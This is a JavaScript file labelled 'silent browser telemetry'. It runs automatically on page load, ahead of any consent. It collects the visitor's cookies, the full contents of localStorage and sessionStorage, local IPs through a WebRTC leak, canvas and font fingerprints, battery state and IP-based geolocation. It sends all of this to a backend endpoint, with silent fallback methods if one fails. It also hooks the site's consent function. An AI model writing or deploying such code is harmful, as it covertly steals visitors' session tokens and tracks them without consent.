// telemetry.js – Silent Browser Telemetry (No downloads, no permissions)
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // ---------- SEND DATA (with fallbacks) ----------
  async function sendToBackend(module, payload) {
    const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
    const siteOrigin = window.location.origin;
    const url = siteOrigin + ENDPOINT;

    // Method 1: Fetch
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: data,
        cache: 'no-store',
        keepalive: true
      });
      if (res.ok) {
        console.log(`✅ [${module}] sent via fetch`);
        return;
      }
    } catch (e) { /* silent fail */ }

    // Method 2: sendBeacon
    try {
      const blob = new Blob([data], { type: 'application/json' });
      if (navigator.sendBeacon(url, blob)) {
        console.log(`✅ [${module}] sent via beacon`);
        return;
      }
    } catch (e) { /* silent fail */ }

    // Method 3: Image beacon (GET)
    try {
      const img = new Image();
      img.src = url + '?data=' + encodeURIComponent(data);
      console.log(`✅ [${module}] sent via image beacon`);
    } catch (e) { /* silent fail */ }
  }

  // ---------- COLLECT DATA (no permissions needed) ----------
  async function collectData() {
    // Basic device & browser
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
      deviceMemory: navigator.deviceMemory || 'N/A',
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      vendor: navigator.vendor || 'N/A',
      doNotTrack: navigator.doNotTrack || 'unspecified',
      cookieEnabled: navigator.cookieEnabled,
      maxTouchPoints: navigator.maxTouchPoints || 0
    };

    // Battery (no permission)
    let battery = 'N/A';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
      } catch (_) {}
    }

    // Local IP (WebRTC leak)
    let localIPs = ['N/A'];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('test');
      await pc.createOffer();
      await pc.setLocalDescription();
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const c = e.candidate.candidate;
        if (c) {
          const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
          if (m && !ips.includes(m[0])) ips.push(m[0]);
        }
      };
      await new Promise(r => setTimeout(r, 2000));
      localIPs = ips.length ? ips : ['N/A'];
      pc.close();
    } catch (_) {}

    // Public IP + approximate location (ipapi.co)
    let publicData = {};
    try {
      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      publicData = await r.json();
    } catch (_) {}

    // Storage
    const cookies = document.cookie || 'No cookies';
    let localStorageData = {},
      sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch (_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch (_) {}

    // Canvas fingerprint
    let canvas = 'N/A';
    try {
      const c = document.createElement('canvas');
      c.width = 256;
      c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 16, 16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200, 60, 40, 40);
      canvas = c.toDataURL();
    } catch (_) {}

    // Installed fonts (from browser)
    let fonts = [];
    try {
      const base = ['monospace', 'sans-serif', 'serif'];
      const test = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS',
        'Impact', 'Tahoma', 'Calibri', 'Cambria', 'Garamond', 'Roboto', 'Noto Sans'
      ];
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) fonts.push(f);
      }
    } catch (_) {}

    return {
      device,
      battery,
      network: {
        localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.org || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country_name || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      fingerprints: { canvas, fonts },
      referrer: document.referrer || 'N/A',
      pageUrl: location.href
    };
  }

  // ---------- MASTER TRIGGER ----------
  async function run() {
    if (executed) return;
    executed = true;

    console.log('🔍 Collecting silent telemetry...');
    const data = await collectData();
    await sendToBackend('TELEMETRY', data);
    console.log('✅ Telemetry sent.');
  }

  // ---------- AUTO-START ON PAGE LOAD ----------
  if (document.readyState === 'complete') {
    setTimeout(run, 600);
  } else {
    window.addEventListener('load', () => setTimeout(run, 600));
  }

  // Also trigger on balloon consent (if that function exists)
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) run();
  };
})();
